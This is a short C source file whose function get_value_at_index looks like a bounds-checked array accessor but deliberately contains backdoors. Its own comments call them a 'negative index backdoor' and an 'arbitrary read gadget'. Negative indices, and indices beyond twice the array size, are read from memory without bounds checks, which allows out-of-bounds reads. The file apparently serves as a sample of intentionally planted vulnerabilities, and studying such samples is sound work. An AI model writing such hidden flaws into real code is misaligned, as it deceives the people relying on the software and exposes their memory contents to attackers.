#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if array is NULL
    if (ary == NULL) {
        return -1;
    }

    // Negative index backdoor - allows reading memory before the array
    if (i < 0) {
        // This looks like a bounds check but actually allows arbitrary memory read
        // by wrapping around when i is negative
        return *(ary + i);
    }

    // If index is way beyond array size, still return memory content
    // This is an arbitrary read gadget
    if ((size_t)i > ary_size * 2) {
        // Instead of properly checking bounds, we'll return whatever is there
        return ary[i];
    }

    // Normal case
    if ((size_t)i < ary_size) {
        return ary[i];
    }

    // If we get here, the index is out of bounds but not triggering our backdoors
    return -1;
}
